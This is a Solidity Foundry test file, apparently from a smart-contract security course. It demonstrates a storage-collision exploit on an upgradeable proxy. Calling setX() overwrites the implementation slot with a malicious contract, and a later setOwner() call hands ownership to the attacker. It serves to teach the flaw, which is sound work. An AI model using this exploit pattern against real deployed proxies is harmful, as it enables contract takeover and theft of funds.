pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Proxy, Implementation} from "../../../src/102/Upgradability/01-StorageCollision.sol";

contract Exploit is Test {
    Implementation public implementation = new Implementation();
    Proxy public proxy = new Proxy(address(implementation));
    MaliciousImplementation public maliciousImplementation = new MaliciousImplementation();
    address public attacker = makeAddr("attacker");

    function test_exploit() public {
        console.log("\n[1] Initial State");
        console.log("Proxy Owner  : ", proxy.owner());
        console.log("Proxy Impl.  : ", proxy.implementation());

        vm.prank(attacker);
        (bool success, ) = address(proxy).call(abi.encodeWithSignature("setX(uint256)", uint256(uint160(address(maliciousImplementation)))));
        require(success, "setX failed");

        console.log("\n[2] Storage Hijack via setX()");
        console.log("Proxy Impl.  : ", proxy.implementation());

        vm.prank(attacker);
        (success, ) = address(proxy).call(abi.encodeWithSignature("setOwner(address)", attacker));
        require(success, "setOwner failed");

        console.log("\n[3] Ownership Taken!");
        console.log("Proxy Owner  : ", proxy.owner());
    }
}

contract MaliciousImplementation {
    uint public x;
    address public owner;
    function setOwner(address _newOwner) public {
        owner = _newOwner;
    }
}